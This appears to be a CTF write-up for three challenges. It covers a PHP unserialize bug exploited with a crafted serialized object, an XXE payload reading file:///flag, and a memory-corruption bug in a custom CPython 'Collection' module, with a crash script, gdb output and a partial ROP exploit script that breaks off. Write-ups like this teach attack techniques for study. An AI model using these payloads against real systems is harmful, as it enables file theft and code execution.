# web

## PHP

```php
<?php

$line = trim(fgets(STDIN));

$flag = file_get_contents('/flag');

class B {
  function __destruct() {
    global $flag;
    echo $flag;
  }
}

$a = @unserialize($line);

throw new Exception('Well that was unexpectedâ€¦');

echo $a;
```

Okay, so it's a classical unserialize vulnerability. The problem for us is to destory it before PHP *Exception*. 
I added an attribute in my serialize object...and it works...

Here it is:
```php
O:1:"B":0:{"b":0}
```

After viewing a few other writeups, it seens PHP will automatically called `__destroy` during unserializing invlaid PHP object.

# rev

## juggle

Not a *rev* challenge actually. It's a XLST injection which looks more web...

The expected solution seems require us to inject the file and change amount of data. But actually we can use a simple payload
to read *flag*:
```XML
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///flag" >]><foo>&xxe;</foo>
```

## collection

Even though this is the easiest one, but I still want to say super hard. The challenge provides a special cpython lib. It has seccomp
rule and some customized list. 

Baiscally, it merely allows follwing functions:
```
exit
exit_group
brk
mmap
munmap
mremap
readv
futex
sigaltstack
close
write
rt_sigaction
```
> Notice that we cannot get seccomp rule by directly using the lib as our `--file` parameter. We should create a python file which calls the function in `Collection` instead and use that script as out `--file` parameter
 
The program implememts a `collection` contianer in cpython, which only stores `long`, `dict`, and `list`. Then, it uses a double link list to store the those structure. `id` is allowd. We can use it to leak address.

The `collection` itself, however, has a `ob_refcnt` varaible. It's a counter for python GC. When it drops below `0`, python GC will `free` the memory region. The problem is that `get` function won't increase the `ob_refcnt` counter. Evem though we are using the object in later statements, the python GC will free it. It's a classical Use After Free.(Something I realize after the CTF...). And most team use this way.

Our bug seems more like an OOB. At the very begining, I can easily trigger crash via this script:
```python
from sys import modules
del modules['os']
import Collection
keys = list(__builtins__.__dict__.keys())
# for key in keys: print(key)
for k in keys:
    if k != 'id' and k != 'hex' and k != 'print' and k != 'range':
        del __builtins__.__dict__[k]

a = Collection.Collection({
        "a":[1],
        "b":[10]
})

a.get('a').insert(1, 'aaaa')
a.get('a').insert(1, 'c'*44+'\x00\x00\x00\x00')
print(a.get('a'))
```

The gdb shows:
```
0x563cbd <PyObject_Repr+77> call   QWORD PTR [r11+0x58]
...
0x0000000063636363 in ?? ()
```

So, we overwrite some pointers in this object. But the problem is that we cannot pivot the stack or called `one_gadget`, which is annoying. The ROP will be terrible since we only control `r11`(which is out pinter) and `[r11+0x58]`(the overwritten address).

My teammate finally figured out the pivot...I never thought that we can use the exploit succesfully since ROP condition is harsh. He uses gadget `mov rbp, [rdi + 8]; call [rbp+0x30]`. `[rdi + 8]` contains a pointer near our payload. Then. `call [rbp + 0x30]` will go to that payload with new pivoted `rbp`. We can write the ROP handy:
```python
from sys import modules
import os
flag = open("flag", "r")
os.dup2(flag.fileno(), 1023)
flag.close()

del modules['os']
import Collection
"""
keys = list(__builtins__.__dict__.keys())
# print(keys)
for k in keys:
	if k != 'id' and k != 'hex' and k != 'print' and k != 'range':
		del __builtins__.__dict__[k]
"""
